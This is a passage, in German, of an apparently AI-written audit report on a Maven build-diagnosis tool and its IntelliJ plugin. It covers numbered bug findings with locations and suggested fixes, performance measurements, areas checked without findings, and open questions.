- **Beleg:** Felder per `javap` geprüft; nicht per Heap-Dump gemessen.
- **Vorschlag:** Im Verlauf nur Konfiguration speichern, `ExecutionEnvironment` nur am letzten Lauf; ältere Rohlogs verwerfen; Marker in ASCII. Aufwand M.

### 52. Ein `Error` im Hintergrund lässt Ladeanzeige und „läuft“ für immer stehen
- **Ort:** `intellij-plugin/.../idea/ui/DetectivePanel.java:432-438` (nur `ProcessCanceledException` und `RuntimeException` gefangen).
- **Szenario:** „Doppelte Klassen“ mit sehr vielen JARs → `OutOfMemoryError`, oder tiefe Rekursion → `StackOverflowError`. Der Rückruf wird nie gepostet; Overlay, `running` und `AnalysisResults` (RUNNING) bleiben bis zum IDE-Neustart.
- **Beleg:** Code.
- **Vorschlag:** Rückruf in `finally` posten, `Throwable` fangen, `ControlFlowException`/`Error` danach weiterwerfen. Aufwand S.

### 53. `FixRunner.apply` prüft keinen Schreibschutz
- **Ort:** `intellij-plugin/.../idea/FixRunner.java:396-407`.
- **Szenario:** Pin oder Upgrade über zwei POMs, eine davon schreibgeschützt (Perforce/ClearCase). Die erste wird geändert, `replaceString` der zweiten wirft: übrig bleiben ein halber Undo-Schritt und „Fix failed“.
- **Beleg:** Code; ob `replaceString` mitten im Command wirft, ist in `runIde` zu prüfen.
- **Vorschlag:** Vorher `ReadonlyStatusHandler.ensureFilesWritable(project, files)`, bei Fehlschlag abbrechen. Aufwand S.

### 54. Effective-POM-Hash am Build-Ende enthält Laufzeit-Properties
- **Ort:** `maven-extension/.../Snapshots.java:87,123-134`; Folgen in `SnapshotStore.java:88`, `SnapshotDiff.java:302-304`.
- **Szenario:** jacoco `prepare-agent` setzt `argLine`, buildnumber/git-commit-id setzen Zeitstempel-Properties. Mit buildnumber zeigt jeder rote Lauf „Effective POM geändert“ für alle Module; nach grünem `verify` mit jacoco und grünem `validate` greift `carryOver` nicht.
- **Beleg:** Code; Plugin-Verhalten aus deren Dokumentation, nicht mit echtem Maven nachgestellt.
- **Vorschlag:** Hash bei `SessionStarted` bilden (vor dem ersten Mojo) und je Projekt merken. Aufwand S–M.

### 55. Homebrew-Maven: Version unbekannt, keine globale settings.xml
- **Ort:** `core/.../env/BuildSetup.java:262-265,293-304`.
- **Szenario:** `/opt/homebrew/bin/mvn` zeigt auf `Cellar/maven/X/bin/mvn` (Env-Skript), die Installation liegt in `Cellar/maven/X/libexec`. `mavenHome` wird `Cellar/maven/X` ohne `lib`/`conf`; Preflight meldet „Maven-Version unbekannt“ (gelb), globale settings fehlen.
- **Beleg:** `ReproWrapper.java` (Homebrew-Layout nachgebaut): `version=null`.
- **Vorschlag:** Fehlt `home/lib`, `home/libexec` versuchen. Aufwand S.

### 56. Enforcer `requireJavaVersion 8` wird anders ausgelegt als im Enforcer
- **Ort:** `core/.../preflight/VersionRange.java:526-527`, aufgerufen aus `PreflightChecks.java:162-163`.
- **Szenario:** Runner Java `1.8.0_392`, Regel `<version>8</version>` bzw. `[8,)` → ERROR „Enforcer lehnt Java ab“, der Enforcer selbst ist zufrieden.
- **Beleg:** `ReproVersionRange.java`: `DIFF` in beiden Fällen. Ab welcher Enforcer-Version „8“ als „1.8“ gilt, ist offline nicht geprüft.
- **Vorschlag:** Für `requireJavaVersion` Grenzen `8`, `7`, … als `1.8`, `1.7` lesen. Aufwand S.

### 57. Abbruch beendet Maven unter Windows nicht
- **Ort:** `core/.../deps/PomFetcher.java:225,231,235`.
- **Szenario:** „Fehlende POMs laden“ abbrechen oder Timeout unter Windows: `process.destroy()` beendet nur `cmd.exe` von `mvn.cmd`/`mvnw.cmd`, die Maven-JVM lädt weiter (Netz, Sperren im lokalen Repository).
- **Beleg:** Code; unter Linux unkritisch (`exec`), Windows nicht getestet.
- **Vorschlag:** `ProcessHandle.descendants()` per Reflection bzw. `taskkill /T /F`. Aufwand M.

### 58. Sichtbare Texte und Farben im Code
- **Ort:**
  - Kern: `env/BuildSetup.java:111` (`"Wrapper (./mvnw)"`), `deps/DuplicateClasses.java:140` (`"(Standardpaket)"`), `deps/ConflictMatrix.java:426` (`"| Artifact |"`), `report/Reports.java:172,175` (`"Offline"`, `"Goals"`), `check/RuntimeChecks.java:191` (`"Surefire argLine: "`); tote deutsche Labels in `snapshot/Change.java:430-441` und `deps/DependencyUsage.java:52-54`.
  - Plugin: `DuplicateClassesPanel.java:376` (`c.getDrop().label() + " raus"`, auch in englischer Oberfläche), `SetupComparisonView.java:142` (`"IDE"`), `ConflictMatrixPanel.java:615` (`"BOM"`), `MavenRunListener.java:47` (deutscher Festtext im Log), `PreflightView.java:87` (`JBColor.GRAY` statt `DetectiveColors`, entgeht dem Kontrasttest).
- **Szenario:** Englische Oberfläche zeigt „→ guava raus“.
- **Beleg:** Code (selbst nachgesehen: `DuplicateClassesPanel.java:376`).
- **Vorschlag:** Schlüssel in beiden Properties-Dateien; tote Labels löschen; Farbe über `DetectiveColors.named`. Aufwand S.

### 59. Maven-API außerhalb von `IdeMaven`
- **Ort:** `intellij-plugin/.../idea/BuildDoctorService.java:30,63-64,217,250`; `MavenRunListener.java:12,77`; `FixRunner.java:27-29,213-219` (`MavenRunnerParameters.clone`, `MavenRunConfigurationType.runConfiguration`).
- **Vorschlag:** `IdeMaven.isMavenRun(env)`, `IdeMaven.runWithExtraArgs(…)` einführen. Aufwand S.

### 60. `StaleExclusionInspection.RemoveExclusionFix` ändert die POM am `editPoms` vorbei
- **Ort:** `intellij-plugin/.../idea/StaleExclusionInspection.java:155-166`.
- **Problem:** PSI-`delete()` ohne Diff-Dialog, ohne `IdeMaven.reimport`; `previewPomFixes` wirkt nicht. Das IDE-Modell bleibt bis zum manuellen Reload veraltet. Zusammen mit #17/#18 entfernt Alt+Enter so eine noch gebrauchte Exclusion ohne die übliche Vorschau.
- **Beleg:** Code selbst nachgesehen.
- **Vorschlag:** `remove-exclusion` als `FixAction` über `FixRunner.editPoms`, `startInWriteAction=false`. Aufwand S.

### 61. Werte gehen ungeescaped in XML; auskommentierte Repositories werden genutzt
- **Ort:** `core/.../deps/PomFetcher.java:41` (Version `[^\s:()]+` erlaubt `<>&`), `:130-134`, `:42,150-160` (`<repositories>` per Regex über Rohtext); `PomEditor.java:404,515-550`.
- **Szenario:**
  - Eine fremde POM im lokalen Repo mit präparierter `<version>` landet über `getMissing()` als zusätzliches XML in der Temp-POM. Maven (strict) lehnt `<build><extensions>` dort ab, zusätzliche `<dependency>`-Einträge bleiben möglich. Einen Weg zur Codeausführung gibt es nicht.
  - Auskommentierte `<repositories>` werden mit angefragt.
  - `setProperty(p, "a&b<c")` erzeugt ungültiges XML.
- **Beleg:** `scratchpad/core-pom/.../FetchInject.java`, `EditorCases.java`.
- **Vorschlag:** Werte XML-escapen, Version auf `[\w.\-+]+` prüfen, Repositories per SAX lesen. Aufwand S.

### 62. `PomEditor` mit Entity, CDATA oder Kommentar im Wert
- **Ort:** `core/.../deps/PomEditor.java:382,776`.
- **Szenario:** `<groupId>org&#46;x</groupId>` bzw. `<![CDATA[g]]>` → „nicht gefunden“, obwohl `PomFile` sie richtig liest. `setVersion` auf `<version>1<!-- LTS --></version>` löscht den Kommentar.
- **Beleg:** `EditorCases.java`.
- **Vorschlag:** Feldwerte dekodieren; nur den Textteil ersetzen. Aufwand S.

### 63. `SourceScanner` verliert echte Nutzungen
- **Ort:** `core/.../deps/SourceScanner.java:203-224`.
- **Szenario:** Ein Textblock mit `\"""` endet zu früh, der Rest der Datei gilt als String. Kotlin `"${org.x.T.f()}"` und Groovy `'''` werden falsch behandelt. Folge in der CLI: A5 meldet eine genutzte Dependency als UNUSED mit Fix `remove-dependency` (die IDE nutzt für Java PSI).
- **Beleg:** `ScanCases.java`: `org.real.Used` fehlt, `org.fake.Inside` wird gezählt; Kotlin-Fall `[]`.
- **Vorschlag:** Escapes im Textblock, `'''`, `${…}` in Kotlin/Groovy-Strings als Code. Aufwand S–M.

### 64. Zyklus zurück zum eigenen Modul
- **Ort:** `core/.../deps/DependencyResolver.java:217,276` (Wurzel nicht in `winners`).
- **Szenario:** `org.l:l:1.0 → com.acme:app:0.9`: das Modul steht als INCLUDED im eigenen Baum, Maven lässt es als Zyklus weg; die Konflikt-Matrix bekommt eine Zeile für das eigene Modul.
- **Beleg:** R5 selbst ausgeführt.
- **Vorschlag:** Schlüssel der Wurzel vorab in `winners` bzw. als CYCLE markieren. Aufwand S.

### 65. `Json` ohne Tiefengrenze; große Zahlen verwerfen die Zeile
- **Ort:** `core/.../io/Json.java:45-63,93-112,173`; `EventLog.java:70-71` fängt nur `IllegalArgumentException`.
- **Szenario:** Eine Events-Zeile mit 100.000 `[` beendet `diagnose` mit `StackOverflowError`; eine Zahl über `Long.MAX_VALUE` lässt die ganze Event-Zeile wegfallen.
- **Beleg:** `scratchpad/core-log/deep.jsonl`, `Repro.java json`.
- **Vorschlag:** Tiefe begrenzen (z. B. 256 → `IllegalArgumentException`), Überlauf als `BigInteger`/`Double`. Aufwand S.

### 66. Proxy- und Mirror-Auswahl weicht von Maven ab
- **Ort:** `core/.../preflight/RemoteRepositories.java:482-495`; `env/MavenSettings.java:202-214` mit `RemoteRepositories.java:190-198`.
- **Szenario:**
  - Proxy p1 (https, `*.example.org` umgangen) und p2 (http): der Preflight nimmt keinen, Maven p2.
  - Benutzer hat `mirrorOf *`, global gibt es `mirrorOf central`: Maven nimmt den globalen (exakte ID über beide Dateien), der Preflight den des Benutzers.
- **Beleg:** Proxy-Fall selbst ausgeführt (`ReproPreflight` Fall 6: `activeProxy(https)=p1 bypasses=true`); Mirror-Fall aus Mavens Code abgeleitet.
- **Vorschlag:** Listen beider Dateien zusammenführen, Auswahl wie `DefaultProxySelector`/`DefaultMirrorSelector`. Aufwand S.

### 67. Relatives `-Dmaven.repo.local` gegen das Arbeitsverzeichnis der JVM aufgelöst
- **Ort:** `core/.../env/BuildSetup.java:162-165`, `PreflightContext.java:468-475`.
- **Szenario:** `.mvn/maven.config` mit `-Dmaven.repo.local=.m2/repository`, `preflight --project DIR` aus einem anderen Verzeichnis → falsches Repository: „neu angelegt“, Parents fehlen.
- **Beleg:** `ReproPreflight` Fall 4 selbst ausgeführt: `report.localRepository=.m2/repository`.
- **Vorschlag:** In `detectCommandLine` mit `projectDir.resolve(…)` auflösen. Aufwand S.

### 68. Kleinere Robustheitspunkte im Kern
- **Ort und Problem:**
  - `deps/DependencyTreeParser.java:86-97`: bei `-Dtokens=extended` (`├─`, `└─`, `│`) bleibt nur die Wurzel, ohne Hinweis.
  - `deps/JarIndex.java:176-189`: `visitFileFailed` nicht überschrieben; eine während des Lesens gelöschte Datei in `target/classes` lässt das ganze Verzeichnis scheitern.
  - `deps/ClassFile.java:147-157`: bei `getSize()==-1` greift `MAX_CLASS_BYTES` nicht.
  - `catalog/RuleCatalog.java:71` / `io/MiniYaml.java:41-48`: Katalog mit UTF-8-BOM → „'schlüssel: wert' erwartet, gefunden: \uFEFF# Katalog“.
  - `catalog/Template.java:41` normalisiert auch Fix-Parameter (`'a  b'` → `'a b'`, nur eigene Kataloge).
  - `check/Coordinates.java:32,45-51`: `.`/`..` als artifactId/version erlaubt; `directoryIn(repo)` zeigt dann auf `parent(repo)` (nur lesend, Löschen durch `FixExecutor.allowed` geschützt).
  - `deps/ClassOrigin.java:407`: 600-JAR-Grenze zählt sources/javadoc/tests-JARs mit.
  - `deps/DependencyResolver.java:173`: transitives `system` wird verworfen, Maven filtert nur test/provided.
  - `check/ClasspathChecks.java:233,547,565`: immer `Cancellation.NONE`.
- **Beleg:** `TreeCases.java`, Code bzw. `Repro.java yaml/template`.
- **Vorschlag:** Je einzeln, jeweils Aufwand S.

### 69. Kleinere UI-Fehler im Plugin
- **Ort und Problem:**
  - `PreflightView.java:136-145`: Wenn die erste Zeile ein ERROR ist, wird später die erste WARNING gewählt (`select == 0` als „nichts gewählt“).
  - `ConflictMatrixPanel.java:338-343`: Spaltenbreiten bei jedem Tastendruck in der Suche zurückgesetzt.
  - `UpgradeSimulatorPanel.java:186-190,501-506,536`: „Übernehmen“ im Tool-Window bleibt bei veraltetem oder laufendem Ergebnis aktiv (im Editor-Tab nicht).
  - `DependenciesPanel.java:73-77,127-133,170-176,211-262`: beim Modulwechsel bleibt die alte Erklärung (auch im Markdown); `selectInList` startet zwei Läufe.
  - `ConflictMatrixPanel.java:222-226,250`, `ExclusionsPanel.java:94-96,127`: `saveUnsavedPoms` bei jedem automatischen Lauf speichert halbfertige POMs.
  - `DependencyUsagePanel.java:57-59,149,252`: Einstellung „über Starter“ wirkt erst nach Neuprüfung.
  - `SetupComparisonView.java:73-81`, `PreflightView.java:159-163`: Strg+C nicht verdrahtet.
  - `BuildDoctorPanel.java:171-204`: ein neuer Lauf reißt den Nutzer aus dem Log-Navigator.
  - `BuildDoctorPanel.java:77-99,333-341`: Netz-Preflight nicht abbrechbar, Ladeanzeige verdeckt den Tab.
  - `FixRunner.java:222-226`: bei Logs aus der Zwischenablage wird `mvn -U` ohne Goals kopiert.
  - `UndeclaredDependencyInspection.java:196`: „Fix all“ erzeugt N−1 Warnungen „schon deklariert“.
- **Beleg:** Code.
- **Vorschlag:** Je einzeln, jeweils Aufwand S.

### 70. Kleinere Performance-Punkte
- **Ort und Problem:**
  - `snapshot/SnapshotDiff.java:388-397`, `Change.java:481-485`: lineare Suche je Änderung. 5000 Änderungen über 800 Module ≈ 2 s am Ende eines roten Builds.
  - `intellij-plugin/.../DiagnosisCard.java:456-468`: `tail` per Regex über das ganze Log auf dem EDT, 20 MB ≈ 70–100 ms je Klick im Verlauf.
  - `ConflictMatrixPanel.java:578-609`: Renderer rechnet je Zelle und Paint 4× `isDivergent`, 2× `versions()` (Set + Sortierung), `MavenVersion.max` und baut den Tooltip.
- **Beleg:** `ReproDiffPerf.java` (1000/3000/5000 Änderungen: 264/518/1976 ms), `scratchpad/plugin-b/tail/Tail.java`.
- **Vorschlag:** Map nach (area, subject, before, after); `tail` rückwärts suchen; `versions`/`suggested` je Zeile cachen, Tooltip über `getToolTipText(MouseEvent)`. Aufwand S.

### 71. Snapshot-Ablage und Zugangsdaten in URLs
- **Ort:** `core/.../snapshot/SnapshotStore.java:52-56` (`toAbsolutePath().normalize()`); `maven-extension/.../Snapshots.java:72`, `preflight/RemoteRepositories.java:300,381,422`.
- **Szenario:**
  - Unter Windows liefert die IDE `C:\Users\x\proj`, `mvn.cmd` nach `cd c:\users\x\proj` aber `c:\…` (ebenso Symlinks wie macOS `/tmp`). Es entstehen zwei Ablagen, ein roter Lauf findet keinen grünen. Die Ablage wird nie aufgeräumt.
  - `https://user:token@nexus/…` steht im Klartext in `latest-extension.json`, auf der Karte und im kopierten Markdown (gesendet wird es nicht).
- **Beleg:** Code.
- **Vorschlag:** `toRealPath()` mit Rückfall, unter Windows klein schreiben; alte Ordner beim Schreiben entfernen; Benutzerangabe in URLs maskieren. Aufwand S.

## Performance-Messungen

Alle Messungen mit JDK 21 unter Linux, Kern aus `core/build/classes` (Stand 71794bc). Wo nicht anders vermerkt, warm im FS-Cache.

| Was | Womit | Eingabegröße | Ergebnis | Engpass |
|---|---|---|---|---|
| `diagnose` mit langer Zeile ohne Leerzeichen | `Main diagnose`, selbst gemessen | 20.000 / 60.000 Zeichen | 1,3 s / 14,8 s | O(L²)-Regex in Prüfungen (#7) |
| Einzelne Regex gegen pathologische Zeilen | `core-log/RegexBench.java` | 107 Regex × 23 Zeilen, 10k / 40k Zeichen | ≥ 20 ms nur in Prüfungen bei 10k; 2–9 s je Regex bei 40k | `UNKNOWN_HOST`, `LOCATION`, `PATH`, corrupt-jar `extract` |
| `diagnose` großes Log | `Main diagnose -Xmx128m`, selbst gemessen | 100 MB, 946k Zeilen | 0,67 s | streamt; unkritisch |
| `outline` großes Log | `Main outline` | 100 MB bei `-Xmx256m` / 300 MB bei `-Xmx256m` | 1,0 s (RSS 331 MB) / OOM nach 0,5 s (selbst gemessen) | `LogOutline.of` hält alle Zeilen (1,5–2× Loggröße) |
| Viele Fehler | `Main diagnose`/`outline` | 96k Zeilen, 4000 fehlgeschlagene Tests | 0,83 s / 0,21 s | keine quadratische Last |
| Gehaltener Speicher Parser | `core-log/Retained.java` | 20 Läufe à 100 MB | 60 MB | ungenutzte `logLines` (#40) |
| DependencyResolver × 201 Module | `core-deps/Bench.java` | 201 POMs, BOM mit 1500 Einträgen, 500 Libs × 2 Versionen, 502k Knoten | 3,0 s (15 ms/Modul; kalt 126 ms), +124 MB | `managed`-Fehltreffer, `byCoordinates` (#45) |
| ConflictMatrix.build | `Bench2` | wie oben, mit Bäumen | 1,38 s | `pin()` → `managed` linear |
| ExclusionAudit.build | `Bench2` | wie oben | 265 ms | – |
| DuplicateClasses.build | `Bench2` | mit Bäumen (JarIndex kalt/warm) / ohne Bäume | 5,5 s / 5,2 s / 10,9 s | Verzeichnis-Lesungen (#20), `fromPoms` (#43) |
| DependencyUsage.build | `Bench2` | wie oben | 5,3 s | Verzeichnis-Lesungen (#20) |
| UpgradeSimulator.simulate | `Bench4` | wie oben | 5,2 s, Ergebnis hält ~98 MB | doppelte Auflösung, kalter Locator (#46) |
| searchRepository | `Bench3` | 590 JARs × 1000 Klassen / 90k Dateien ohne JARs | 216 ms (+52 MB im Index) / 0,3 s | Cache-Wachstum (#30) |
| Inspection: Reactor-`target/classes` | `plugin-a/DirCost.java` | 3000 Klassen, 24 MB | 17–48 ms je Aufruf (warm) | kein Verzeichnis-Cache (#20) |
| Reactor-Scan je Editor-Neuberechnung | `plugin-a/ScanCost.java` | 316 Module | 30–170 ms | `ProjectPoms.all()` ohne Cache (#29) |
| `PomEditor.pinManagedVersion` | `core-pom/PerfEditor.java` | 1k / 10k / 50k Deps (0,24 / 2,4 / 12 MB) | 4,8 / 37 / 148 ms | linear, unkritisch |
| `JarIndex` | `core-pom/JarPerf.java` | 115 JARs, 27k Klassen | 103 ms kalt, 0,9 ms warm, ~85 B/Klasse | – |
| Snapshot JSON | `core-env/ReproSnapshot.java`, selbst ausgeführt | 400 Module × 250 Deps × 40 Plugins (5,4 MB) | `toJson` 47 ms, `fromJson` 62 ms, `saveGreen` 44–75 ms | unkritisch |
| SnapshotDiff.compare | `core-env/ReproDiffPerf.java` | 1000 / 3000 / 5000 Änderungen | 264 / 518 / 1976 ms | lineare Suche (#70) |
| Events-JSONL parallel | `core-env/ReproJsonlInterleave.java`, selbst ausgeführt | 4 Threads × 2000 Events | 1149 von 8000 Zeilen unlesbar | fehlende Synchronisation (#48) |

Die Repro- und Messdateien liegen im Scratchpad dieser Sitzung (`/tmp/claude-1000/-home-timo--claude-spares-spare-6Il2xv/de9bacef-552b-4a16-aa8a-b7f732285ef9/scratchpad/`, Unterordner `core-log`, `core-env`, `core-pom`, `core-deps`, `plugin-a`, `plugin-b`, `me`). Sie sind flüchtig und nicht Teil des Repos.

## Geprüft, ohne Befund

- **Tests:** `./gradlew :core:test` grün (200 Tests, 0 Fehler).
- **Java 8:** `core` und `maven-extension` kompilieren mit `options.release.set(8)`, verbotene API scheitert schon beim Bauen. Unabhängig nachgeprüft: der ganze `core/src/main/java` kompiliert mit `javac --release 8` (Major 52).
- **Zeichensatz:** Außer in `FixExecutor` (#1) und der beabsichtigten Maven-Ausgabe in `PomFetcher` überall ausdrücklich UTF-8; kein `FileReader`, kein `getBytes()` ohne Charset.
- **Ressourcen:** `ZipFile`, Streams, `DirectoryStream`, `HttpURLConnection` (`disconnect` im `finally`) werden geschlossen.
- **XXE:** `disallow-doctype-decl` bzw. `FEATURE_SECURE_PROCESSING` in `PomFile`, `ProjectPoms`, `MavenSettings`; eine externe Entity wird abgelehnt.
- **Path Traversal:** `delete-files` prüft `normalize` + `startsWith(root)` und verweigert die Wurzel selbst; getestet mit `repo/../outside/victim.jar`. `replace-in-file`, `set-jvm-option` und POM-Fixes bekommen ihren Pfad nicht aus dem Log. Die CLI führt keine Diagnose-Fixes aus.
- **Netz und Zugangsdaten:** Netz nur mit `Options.network(true)`; keine Server- oder Proxy-Passwörter aus settings.xml gelesen; Timeouts gesetzt; `nonProxyHosts` und `mirrorOf` (`*`, `external:*`, `!id`) wie Maven. `PomFetcher` übergibt keine POM-Werte in argv, liest die Ausgabe in eigenem Thread (kein Deadlock), Timeout/Abbruch beenden Maven unter Linux.
- **Extension:** `init`, `onEvent`, `Snapshots.record` fangen `Throwable`; unbekannte Event-Typen über `NoSuchFieldError` abgefangen; Ursachenkette begrenzt; alle Maven-Methoden seit ≤ 3.3.1 vorhanden und in `extension.xml` von maven-core 3.9.11 exportiert; JAR ohne fremde `META-INF`. Pro Event nur `getExceptions()`/`switch`, Flush nur bei Fehler-Events.
- **Snapshots:** atomares Schreiben (Temp + `ATOMIC_MOVE`), JSON-Rundreise mit Steuerzeichen/Surrogaten identisch, fehlende Module bei `-pl` nicht gemeldet.
- **Regel-Engine:** stabile Sortierung nach Priorität, Prüfungen in Katalogreihenfolge, erste bestätigende Prüfung mit Ursache gewinnt; `Template`/`Texts.format` sicher gegen `$ \ { }`; keine quadratische Last „Regeln × Zeilen“ (4000 Fehler in 0,83 s).
- **MiniYaml/Json:** `''`-Escapes, Kommentare, Block-Skalare, Listen von Maps; Nicht-Unterstütztes bricht mit Zeilenfehler ab. Surrogatpaare bleiben erhalten.
- **Log-Parser:** ANSI in `[LEVEL]`/`BUILD …`, verschachteltes `[ERROR] [ERROR]`, GitHub-ISO, Jenkins `[ISO]`, `HH:mm:ss(,SSS)`.
- **Texte:** EN- und DE-Schlüssel gleich, keine Duplikate; alle Literal-Schlüssel aus dem Code vorhanden.
- **PomEditor:** CRLF, Tabs, 4er-Einrückung, einzeilige POMs, PIs, DOCTYPE mit internem Subset, `>` in Attributen, Whitespace in Werten; Profile und Plugin-`<dependencies>` bleiben unberührt; Laufzeit linear.
- **EffectiveModel/PomLocator:** Interpolation im Kontext des Kindes, BOM-Import „erster gewinnt“, Parent- und Import-Zyklen abgesichert; `relativePath` als Verzeichnis, Standard und leer. `PomCache` begrenzt und thread-sicher.
- **ClassFile:** Konstantenpool-Tags 1–20, Long/Double mit 2 Slots, kaputte Attributlängen → `IOException`.
- **DependencyResolver:** nearest wins, BFS = Mavens Pre-order, Verlierer nicht expandiert, Scopes wie `JavaScopeDeriver`/`JavaScopeSelector`, Exclusions kumulativ mit `*`, type/classifier im Konfliktschlüssel, `MAX_NODES`, Tiefe 60, Abbruch je Knoten.
- **ConflictMatrix/DuplicateClasses/UpgradeSimulator:** Pin im nächsten gemeinsamen Projekt-Parent, Blocker korrekt, BOM-Importe blockieren nie; Gruppierung in DuplicateClasses linear (kein Paarvergleich); `fixesFor` schreibt in die deklarierende POM; Planner überschreibt externe Properties in der obersten Projekt-POM.
- **ExclusionAudit:** fehlende POM, Parent oder offene Version → UNKNOWN, nie STALE (außer #17, #18, #41).
- **Plugin-Threading:** `analyzeLog`, `recordGreen`, `preflight`, `compareSetups`, `loadGreen` im Hintergrund, Anzeige per `invokeLater(…, project.getDisposed())`; `IdeMaven.read` = `runReadAction`; PCE wird vor jedem `catch (RuntimeException)` weitergeworfen; `invokeLater` in `Background` mit `defaultModalityState()`.
- **ActionUpdateThread:** alle registrierten Aktionen überschreiben ihn korrekt (`BuildDoctorActions`/`DetectiveActions` EDT; `WhyThisVersion`, `SimulateUpgrade`, `PreviewPomFixes` BGT ohne Swing in `update`).
- **Lebensdauer:** `LogNavigatorView` gibt den Editor frei; `PomDiffView` hängt am Dialog/Editor; MessageBus-Verbindungen und Listener haben ein Parent-Disposable; keine PSI-Felder ohne Pointer.
- **Editor:** Line-Marker nur am `XML_NAME`-Blatt; Inlay, Code Vision und Line-Marker lesen nur gecachte Facts; doppelte Klassen nie aus dem Editor; `DumbAware` plausibel.
- **POM-Änderungen in den Panels:** Matrix, Exclusions, Doppelte Klassen, Nutzung und Upgrade laufen über `FixRunner.editPoms` mit Neu-Plan-Vergleich und einem `WriteCommandAction` (Ausnahmen: #10, #60).
- **plugin.xml:** alle genutzten EPs in 2025.3 `dynamic="true"`, Listener deklarativ; ASM-Scan gegen 2025.3: keine `@Deprecated`/`@Internal`-API, nur `@Experimental` `InlayProvider` (`BuildFailureConsoleFilter`) und `@Obsolete` `Task.Backgroundable`/`ProgressManager.run`.
- **HTML in Detailansichten:** Nutzdaten überall per `Html.esc` (Ausnahme Benachrichtigungen, #26).
- **Tabellen:** kein `RowSorter`; Indexe konsistent konvertiert.

## Offene Fragen

- **Plugin Verifier:** Was meldet `verifyPlugin` tatsächlich? Erwartet werden die `@Experimental`-/`@Obsolete`-Hinweise und evtl. `impl`-Pakete (`RunDialog`, `NamedLibraryElement`). In der Sandbox ohne Netz nicht lauffähig.
- **`runIde`:**
  - Rendert die Sprechblase `<server>` als Tag (#26)?
  - Wirft `replaceString` bei schreibgeschütztem Dokument mitten im Command (#53)?
  - Wie viel hält ein Run-Descriptor im Verlauf nach dem Schließen der Konsole (#51, Heap-Dump)?
  - Werden Maven-Läufe beim Schließen des Tabs abgekoppelt statt beendet? `ProcessHandler.detachProcess` meldet Exit 0, `MavenRunListener` würde das als grünen Lauf werten und eine neue Referenz schreiben.
  - Wie verhält sich „Fix all in file“ bei `DeclareFix` (#69)?
- **Windows:** UNC-Zugriff (#4) und Prozessabbruch (#57) sind nicht auf Windows nachgestellt.
- **Echtes Maven** (lokal kein `mvn`, kein Netz):
  - Ruft der `EventSpyDispatcher` `onEvent` unter `-T` parallel auf (#48)?
  - Läuft die Extension unter Maven 3.6.x und 4 (cling, `versionProperties`)?
  - Entfernt Maven 3.9 `#`-Kommentare in `.mvn/jvm.config` (#36)?
  - Wie behandelt `ClassicDependencyManager` verwaltete Exclusions bei direkten Dependencies mit eigenen Exclusions?
  - Ab welcher Enforcer-Version gilt `8` als `1.8` (#56)?
- **IDE-Authenticator:** Sendet `IdeaWideAuthenticator` bei einem Server-401 gemerkte Zugangsdaten oder zeigt er nur einen Dialog (#49)?
- **Laufzeit am Build-Ende:** Wie lange dauert `printDiagnosis` (Resolver, `JarIndex`, `searchRepository`) bei großen Reactors auf dem Maven-Hauptthread? Lokal fehlt ein großes `~/.m2`.
- **Gewolltes Verhalten?**
  - `pinManagedVersion` ändert eine gemeinsame `${prop}` und damit alle Geschwister-Artefakte (z. B. alle Jackson-Module).
  - Soll `diagnose` Logs mit `BUILD SUCCESS` überhaupt diagnostizieren (#38)?
  - Sollen Matrix und Exclusions schon beim Öffnen des Tool-Windows und nach jedem Import rechnen, auch wenn die Seite nie angesehen wird?
  - Ist der Sprung auf den neuesten Lauf bei jedem `historyChanged` beabsichtigt (#69)?
  - Soll der Upgrade-Simulator geschachtelte BOM-Importe heben können?
- **Unter `-T`:** Ordnet die Outline verschachtelte Zeilen dem richtigen Modul zu? Nicht getestet.
